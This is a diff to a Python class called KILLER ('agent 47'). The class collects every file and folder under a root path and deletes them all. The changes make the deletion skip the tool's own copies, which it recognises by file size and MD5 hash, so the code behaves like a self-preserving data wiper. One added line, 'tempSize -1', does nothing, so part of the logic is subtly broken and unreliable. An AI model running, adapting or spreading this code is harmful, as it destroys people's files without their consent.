@@ -7,15 +7,17 @@ class KILLER():
 		self.Files = []
 		self.Folders = []
 		self.rootPath = rootPath
-		self.agents = [__file__]
+		with open(__file__, 'rt') as f:
+			self.agents = {__file__:(os.stat(__file__).st_size, h.md5(f.read().encode()).hexdigest())}
 
 		for i in agents:
 			if i not in self.agents:
-				self.agents.append(i)
+				with open(i, 'rt') as f:
+					self.agents[i] = (os.stat(i).st_size, h.md5(f.read().encode()).hexdigest())
 
 	def __repr__(self):
 		if len(self.Folders) > 0 and len(self.Files) > 0:
-			return '<agent 47, location={},\ntargets:\n\tfiles=[{}],\n\n\tfolders=[{}]>'.format(self.rootPath, ',\n\t'.join(['\'{}\''.format(i) for i in self.Files]), ',\n\t'.join(['\'{}\''.format(i) for i in self.Folders]))
+			return '<agent 47, location={},\ntargets:\n\tfiles=[{}],\n\n\tfolders=[{}]>'.format(self.rootPath, ',\n\t'.join(['"{}"'.format(i) for i in self.Files]), ',\n\t'.join(['"{}"'.format(i) for i in self.Folders]))
 
 		else:
 			return '<agent 47, location={}, targets: files={}, folders={}>'.format(self.rootPath, self.Files, self.Folders)
@@ -53,12 +55,42 @@ class KILLER():
 
 		self.Files, self.Folders = sorted(self.Files, key=lel)[::-1], sorted(self.Folders, key=lel)[::-1]
 
+	def checkFromAgents(self, location):
+		'''
+		checks if an agent in location
+		'''
+
+		tempSize = os.stat(location).st_size
+
+		if tempSize > 133504000:
+			tempSize -1
+			tempHash = 0
+		else:
+			with open(location, 'rt') as f:
+				try:
+					tempHash = h.md5(f.read().encode()).hexdigest()
+
+				except UnicodeDecodeError:
+					tempHash = 0
+
+		for agentLoc, agentId in self.agents.items():
+			if agentId[0] == tempSize:
+				if agentId[1] == tempHash:
+					return True
+
+		return False
+
 	def kill(self):
 		'''
 		deletes everything that was found by pfr()
 		'''
 		for i in self.Files:
-			os.unlink(i)
+			if not self.checkFromAgents(i):
+				os.unlink(i)
 
 		for i in self.Folders:
-			os.rmdir(i)
+			try:
+				os.rmdir(i)
+
+			except Exception as e:
+				print ('failed to remove \'{}\': {}, maybe an agent is inside'.format(i, e))
